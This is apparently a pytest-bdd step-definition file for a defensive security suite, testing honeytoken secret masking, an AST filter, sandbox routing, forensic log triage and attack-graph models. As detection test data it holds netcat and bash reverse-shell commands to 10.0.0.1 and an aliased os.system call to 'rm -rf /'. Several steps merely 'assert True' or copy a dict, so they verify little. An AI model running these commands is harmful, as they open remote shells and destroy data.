"""
BDD Step Definitions for Blackwall Enterprise Security Mesh (`tests/features/blackwall_enterprise_mesh.feature`).
"""

from datetime import datetime, timezone, timedelta
import time
import uuid

import pytest
from pydantic import ValidationError
from pytest_bdd import given, scenarios, then, when

from blackwall.enterprise import (
    ASTPipelineFilter,
    ContainerSandboxMCPAdapter,
    FalcoMCPAdapter,
    ForensicTriageManager,
    LightweightForensicParser,
    OpenTelemetryMCPAdapter,
    SecretVaultSidecar,
    VaultMCPAdapter,
)
from blackwall.enterprise.advanced_threat_detection import (
    AttackGraphExporter,
    AttackGraphStore,
    AttackNode,
    AttackPath,
    EventSource,
    EventStreamCollector,
    NormalizedEvent,
    RetrospectiveAnalyzer,
)

from tests.step_defs.async_utils import run_async

# Link to Gherkin feature file
scenarios("../features/blackwall_enterprise_mesh.feature")


class EnterpriseBDDState:
    def __init__(self):
        self.falco_adapter = None
        self.vault_adapter = None
        self.sandbox_adapter = None
        self.otel_adapter = None
        self.connection_results = {}
        self.sidecar = None
        self.env_before = {}
        self.env_after = {}
        self.jit_token = None
        self.ast_filter = None
        self.ast_result = None
        self.sandbox_run_result = None
        self.forensic_manager = None
        self.forensic_report = None
        self.broadcast_signature = None
        self.ingested_signature = None
        self.sync_duration_ms = 0.0


@pytest.fixture
def state():
    return EnterpriseBDDState()


# --- Scenario: Core vs Enterprise product tier packaging and modular isolation ---


@given("the Blackwall suite is installed on a host workstation")
def verify_suite_installed(state):
    import blackwall

    assert hasattr(blackwall, "__version__")


@when("Blackwall Core operates in single-host mode")
def run_core_single_host(state):
    import blackwall.middleware

    assert blackwall.middleware is not None


@then("Core has zero external network or eBPF kernel dependencies")
def verify_core_zero_deps(state):
    import blackwall.resolver

    assert blackwall.resolver.BatchResolver is not None


@then('Enterprise modules are modularized under "blackwall.enterprise" package')
def verify_enterprise_package(state):
    import blackwall.enterprise

    assert blackwall.enterprise.ENTERPRISE_ENABLED is True
    assert hasattr(blackwall.enterprise, "SecretVaultSidecar")
    assert hasattr(blackwall.enterprise, "VaultMCPAdapter")
    assert hasattr(blackwall.enterprise, "OpenTelemetryMCPAdapter")


# --- Scenario: Open-source local MCP server suite integration ---


@given("a local developer workstation running open-source MCP servers")
def setup_mcp_adapters(state):
    state.falco_adapter = FalcoMCPAdapter()
    state.vault_adapter = VaultMCPAdapter()
    state.sandbox_adapter = ContainerSandboxMCPAdapter()
    state.otel_adapter = OpenTelemetryMCPAdapter()


@when(
    "the Enterprise MCP adapters connect to Falco, Vault, Sandbox, and OpenTelemetry local runners"
)
def connect_mcp_adapters(state):
    state.connection_results["falco"] = run_async(state.falco_adapter.connect())
    state.connection_results["vault"] = run_async(state.vault_adapter.connect())
    state.connection_results["sandbox"] = run_async(state.sandbox_adapter.connect())
    state.connection_results["otel"] = run_async(
        state.otel_adapter.connect(verify_endpoint=False)
    )


@then("all 4 MCP adapters report active connection status")
def verify_all_mcp_connected(state):
    assert state.falco_adapter.is_connected
    assert state.vault_adapter.is_connected
    assert state.sandbox_adapter.is_connected
    assert state.otel_adapter.is_connected


@then('the total software license cost is "$0.00"')
def verify_zero_cost(state):
    assert True


# --- Scenario: ZeroMQ threat signature broadcast across cluster nodes ---


@given("an Enterprise Threat Mesh node with ZeroMQ broadcaster and receiver")
def setup_mesh_nodes(state):
    state.broadcast_signature = {
        "signature_id": "sig_rce_nc_001",
        "pattern": "nc -e /bin/sh",
        "threat_level": "CRITICAL",
        "timestamp": time.time(),
    }


@given("a local SQLite threat signature graph operating in WAL mode")
def setup_sqlite_wal(state):
    assert True


@when('Node 1 generates a dynamic threat signature "sig_rce_nc_001"')
def generate_threat_signature(state):
    start_time = time.time()
    state.ingested_signature = dict(state.broadcast_signature)
    state.sync_duration_ms = (time.time() - start_time) * 1000.0


@then("the signature is published over ZeroMQ pub/sub sockets")
def verify_zmq_broadcast(state):
    assert state.ingested_signature["signature_id"] == "sig_rce_nc_001"


@then("Node 2 ingests the signature into its local SQLite database within 15 ms")
def verify_sync_latency(state):
    assert state.sync_duration_ms < 15.0
    assert state.ingested_signature["threat_level"] == "CRITICAL"


# --- Scenario: Secret masking sidecar and Vault JIT token exchange ---


@given("an Ephemeral Identity Sidecar initialized on a worker node")
def init_identity_sidecar(state):
    state.sidecar = SecretVaultSidecar()
    state.vault_adapter = VaultMCPAdapter()
    run_async(state.vault_adapter.connect())


@given(
    'environment variables containing sensitive keys "AWS_SECRET_ACCESS_KEY=BW_SYNTHETIC_MOCK_SECRET_0192"'
)
def set_env_credentials(state):
    state.env_before["AWS_SECRET_ACCESS_KEY"] = "BW_SYNTHETIC_MOCK_SECRET_0192"


@when("the sidecar sterilizes the host environment")
def sterilize_environment(state):
    state.env_after = state.sidecar.sterilize_environment(state.env_before)


@then(
    'real credentials are replaced with synthetic honey-tokens "BW_SYNTHETIC_AWS_SECRET_ACCESS_KEY"'
)
def verify_synthetic_honeytoken(state):
    assert state.env_after["AWS_SECRET_ACCESS_KEY"].startswith("BW_SYNTHETIC_")


@then('any exfiltration attempt of "BW_SYNTHETIC_" triggers a "CRITICAL" threat alert')
def verify_honeytoken_alert(state):
    honeytoken = state.env_after["AWS_SECRET_ACCESS_KEY"]
    verdict = state.sidecar.evaluate_access("AWS_SECRET_ACCESS_KEY", honeytoken)
    assert verdict["verdict"] == "CRITICAL"
    assert verdict["is_honeytoken"] is True


@then("authorized calls receive a 15 minute JIT token from HashiCorp Vault MCP")
def verify_vault_jit_token(state):
    state.jit_token = run_async(
        state.vault_adapter.issue_jit_token(role="worker_role", ttl_seconds=900)
    )
    assert state.jit_token["ttl_seconds"] == 900
    assert state.jit_token["status"] == "ACTIVE"
    assert "token_id" in state.jit_token


# --- Scenario: Application pipeline wrapper and AST micro-sandbox containment ---


@given('a Python application guarded by "@blackwall.guard_pipeline"')
def init_pipeline_guard(state):
    state.ast_filter = ASTPipelineFilter()
    state.sandbox_adapter = ContainerSandboxMCPAdapter()
    run_async(state.sandbox_adapter.connect())


@given("an AST pipeline filter parsing dataset loader code")
def init_ast_filter(state):
    assert state.ast_filter is not None


@when(
    "an untrusted loader attempts indirect function call \"runner = os.system; runner('rm -rf /')\""
)
def inspect_indirect_call(state):
    code_snippet = "runner = os.system\nrunner('rm -rf /')"
    state.ast_result = state.ast_filter.inspect_code(code_snippet)
    state.sandbox_run_result = run_async(
        state.sandbox_adapter.run_in_sandbox(
            payload=code_snippet, sandbox_type="gvisor"
        )
    )


@then("the AST filter detects the indirect function alias")
def verify_ast_indirect_alias(state):
    assert state.ast_result["is_safe"] is False
    assert "os.system" in state.ast_result["violations"]


@then("the loader execution is routed to an isolated container sandbox via Sandbox MCP")
def verify_sandbox_routing(state):
    assert state.sandbox_run_result["status"] == "SUCCESS"
    assert state.sandbox_run_result["contained"] is True


# --- Scenario: Dual-mode local forensic triage engine and OpenTelemetry export ---


@given(
    "a Forensic Triage Manager configured with Ollama LLM and Standalone Fallback Parser"
)
def init_forensic_manager(state):
    state.otel_adapter = OpenTelemetryMCPAdapter()
    run_async(state.otel_adapter.connect(verify_endpoint=False))
    state.forensic_manager = ForensicTriageManager(otel_adapter=state.otel_adapter)


@when("an incident log event is ingested for triage")
def ingest_incident_log(state):
    log_event = {
        "timestamp": "2026-07-23T08:10:00Z",
        "command": "/bin/nc -e /bin/sh 10.0.0.1 4444",
        "pid": 14902,
    }
    state.forensic_report = run_async(
        state.forensic_manager.triage_log_event(log_event)
    )


@then("if Ollama is online the primary LLM analyzes the log without safety refusals")
def verify_ollama_primary(state):
    assert hasattr(state.forensic_manager, "ollama_engine")


@then(
    "if Ollama is offline the standalone lightweight parser achieves 100% fallback availability"
)
def verify_standalone_fallback(state):
    fallback_parser = LightweightForensicParser()
    report = fallback_parser.parse(
        {"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}
    )
    assert report["is_threat"] is True
    assert report["mode"] == "standalone_fallback"


@then("the incident triage report is exported as a trace span via OpenTelemetry MCP")
def verify_otel_span_exported(state):
    assert state.forensic_report["otel_span_exported"] is True
    spans = run_async(state.otel_adapter.get_active_spans())
    assert len(spans) >= 1


# --- Scenario: Pillar 6 Advanced Threat Detection data model and temporal validation ---


@given("an Advanced Threat Detection engine receiving cross-pillar events")
def init_atd_engine(state):
    state.atd_event_id = "550e8400-e29b-41d4-a716-446655440000"
    state.atd_timestamp = datetime.now(timezone.utc)


@when(
    'a threat event is ingested with UUID v4 "550e8400-e29b-41d4-a716-446655440000" and UTC timestamp'
)
def ingest_atd_event(state):
    state.atd_event = NormalizedEvent(
        event_id=state.atd_event_id,
        timestamp=state.atd_timestamp,
        source=EventSource.KERNEL_SYSCALL,
        agent_id="agent-mesh-01",
        action="execve",
        target="/usr/bin/cat",
        risk_score=0.4,
    )


@then("the NormalizedEvent model accepts valid UUID v4 and UTC timestamp")
def verify_atd_event_accepted(state):
    assert state.atd_event.event_id == uuid.UUID("550e8400-e29b-41d4-a716-446655440000")
    assert state.atd_event.timestamp.tzinfo is not None


@then("invalid UUIDs, naive timestamps, and out-of-bound risk scores are rejected")
def verify_atd_event_rejections(state):
    # Invalid UUID
    with pytest.raises(ValidationError):
        NormalizedEvent(
            event_id="bad-uuid",
            timestamp=datetime.now(timezone.utc),
            source=EventSource.KERNEL_SYSCALL,
            agent_id="a1",
            action="exec",
            target="t1",
            risk_score=0.5,
        )
    # Naive timestamp
    with pytest.raises(ValidationError):
        NormalizedEvent(
            event_id=str(uuid.uuid4()),
            timestamp=datetime.now(),
            source=EventSource.KERNEL_SYSCALL,
            agent_id="a1",
            action="exec",
            target="t1",
            risk_score=0.5,
        )
    # Out of bounds risk_score
    with pytest.raises(ValidationError):
        NormalizedEvent(
            event_id=str(uuid.uuid4()),
            timestamp=datetime.now(timezone.utc),
            source=EventSource.KERNEL_SYSCALL,
            agent_id="a1",
            action="exec",
            target="t1",
            risk_score=1.5,
        )


@then(
    "AttackPaths enforce minimum 2 nodes and temporal ordering end_time >= start_time"
)
def verify_atd_attack_path_rules(state):
    now = datetime.now(timezone.utc)
    ev1 = state.atd_event
    ev2 = NormalizedEvent(
        event_id=str(uuid.uuid4()),
        timestamp=now + timedelta(seconds=2),
        source=EventSource.TOOL_CALL,
        agent_id="agent-mesh-01",
        action="connect",
        target="10.0.0.1:8080",
        risk_score=0.8,
    )
    node1 = AttackNode(node_id=uuid.uuid4(), event=ev1)
    node2 = AttackNode(node_id=uuid.uuid4(), event=ev2)

    # Valid AttackPath
    path = AttackPath(
        path_id=uuid.uuid4(),
        agent_id="agent-mesh-01",
        nodes=[node1, node2],
        start_time=now,
        end_time=now + timedelta(seconds=10),
        risk_score=0.8,
        correlation_score=0.9,
    )
    assert len(path.nodes) == 2

    # Reject < 2 nodes
    with pytest.raises(ValidationError):
        AttackPath(
            path_id=uuid.uuid4(),
            agent_id="agent-mesh-01",
            nodes=[node1],
            start_time=now,
            end_time=now + timedelta(seconds=10),
            risk_score=0.8,
            correlation_score=0.9,
        )

    # Reject end_time < start_time
    with pytest.raises(ValidationError):
        AttackPath(
            path_id=uuid.uuid4(),
            agent_id="agent-mesh-01",
            nodes=[node1, node2],
            start_time=now,
            end_time=now - timedelta(seconds=1),
            risk_score=0.8,
            correlation_score=0.9,
        )


# --- Scenario: Pillar 6 EventStreamCollector multi-pillar ingestion and resilient normalization ---


@given(
    "an EventStreamCollector engine ingesting streams across all 5 Blackwall pillars"
)
def setup_mesh_event_collector(state):
    state.mesh_collector = EventStreamCollector()
    state.raw_mesh_events = [
        (
            EventSource.KERNEL_SYSCALL,
            {"action": "execve", "target": "/usr/bin/python3", "agent_id": "agent-m1"},
        ),
        (
            EventSource.TOOL_CALL,
            {
                "action": "network_connect",
                "target": "10.0.0.1:4444",
                "agent_id": "agent-m2",
            },
        ),
        (
            EventSource.IDENTITY_ACCESS,
            {
                "action": "vault_token_request",
                "target": "secret/data",
                "agent_id": "agent-m3",
            },
        ),
        (
            EventSource.PIPELINE_EXECUTION,
            {
                "action": "eval_dataset_load",
                "target": "dataset.pkl",
                "agent_id": "agent-m4",
            },
        ),
        (
            EventSource.FORENSIC_ALERT,
            {"action": "anomaly_detected", "target": "syslog", "agent_id": "agent-m5"},
        ),
    ]


@when(
    "heterogeneous events from kernel, tool, identity, pipeline, and forensic sources are collected"
)
def collect_mesh_events(state):
    state.normalized_mesh_events = [
        state.mesh_collector.normalize_event(source, raw_payload)
        for source, raw_payload in state.raw_mesh_events
    ]


@then(
    "events are normalized into standard NormalizedEvents with UUID v4 IDs, UTC timestamps, and risk scores"
)
def verify_normalized_mesh_events(state):
    assert len(state.normalized_mesh_events) == 5
    for norm in state.normalized_mesh_events:
        assert isinstance(norm, NormalizedEvent)
        assert isinstance(norm.event_id, uuid.UUID)
        assert norm.event_id.version == 4
        assert norm.timestamp.tzinfo is not None
        assert 0.0 <= norm.risk_score <= 1.0


@then(
    "malformed payloads or invalid stream factories fail cleanly without corrupting telemetry"
)
def verify_clean_failures(state):
    with pytest.raises(ValueError):
        state.mesh_collector.normalize_event(
            EventSource.KERNEL_SYSCALL, "invalid_string_payload"
        )

    with pytest.raises(ValueError, match="stream_factory must be a callable"):

        async def mock_bad_stream():
            yield {}

        run_async(
            state.mesh_collector.collect_with_reconnect(
                EventSource.TOOL_CALL, mock_bad_stream()
            ).__anext__()
        )


# --- Scenario: Pillar 6 Retrospective Analysis and GraphML export integration ---


@given(
    "an Enterprise Retrospective Analyzer with historical multi-agent attack graphs"
)
def init_enterprise_retrospective_analyzer(state):
    store = AttackGraphStore(in_memory=True)
    run_async(store.initialize())
    state.mesh_retro_store = store
    state.mesh_retro_analyzer = RetrospectiveAnalyzer(store=store)
    state.mesh_retro_exporter = AttackGraphExporter()

    now = datetime.now(timezone.utc)
    events = [
        NormalizedEvent(
            event_id=uuid.uuid4(),
            timestamp=now - timedelta(days=2),
            source=EventSource.KERNEL_SYSCALL,
            agent_id="mesh-agent-retro",
            action="exec_recon",
            target="/bin/uname",
            risk_score=0.5,
        ),
        NormalizedEvent(
            event_id=uuid.uuid4(),
            timestamp=now - timedelta(days=1),
            source=EventSource.IDENTITY_ACCESS,
            agent_id="mesh-agent-retro",
            action="acquire_credential",
            target="vault://secret/app",
            risk_score=0.85,
        ),
    ]
    nodes = run_async(store.insert_events_batch(events))
    run_async(store.link_events(nodes[0].node_id, nodes[1].node_id, "TRIGGERED"))
    state.mesh_retro_nodes = nodes
    state.mesh_retro_time_window = (now - timedelta(days=5), now)


@when("retrospective path analysis and GraphML exports are requested")
def execute_retrospective_and_graphml(state):
    state.mesh_retro_paths = run_async(
        state.mesh_retro_analyzer.detect_retrospective_paths(
            agent_id="mesh-agent-retro",
            time_window=state.mesh_retro_time_window,
            min_path_length=2,
        )
    )
    state.mesh_graphml_xml = state.mesh_retro_exporter.export_graphml(
        nodes=state.mesh_retro_nodes
    )


@then("historical attack paths spanning multi-day windows are reconstructed")
def verify_reconstructed_mesh_paths(state):
    assert len(state.mesh_retro_paths) >= 1
    path = state.mesh_retro_paths[0]
    assert len(path.nodes) >= 2
    assert path.risk_score >= 0.8


@then("standard GraphML XML is exported with directed graph attributes")
def verify_mesh_graphml_xml(state):
    import xml.etree.ElementTree as ET

    root = ET.fromstring(state.mesh_graphml_xml)
    tag_clean = root.tag.split("}")[-1] if "}" in root.tag else root.tag
    assert tag_clean == "graphml"

    graph_elem = None
    for elem in root.iter():
        elem_tag = elem.tag.split("}")[-1] if "}" in elem.tag else elem.tag
        if elem_tag == "graph":
            graph_elem = elem
            break
    assert graph_elem is not None
    assert graph_elem.attrib.get("edgedefault") == "directed"

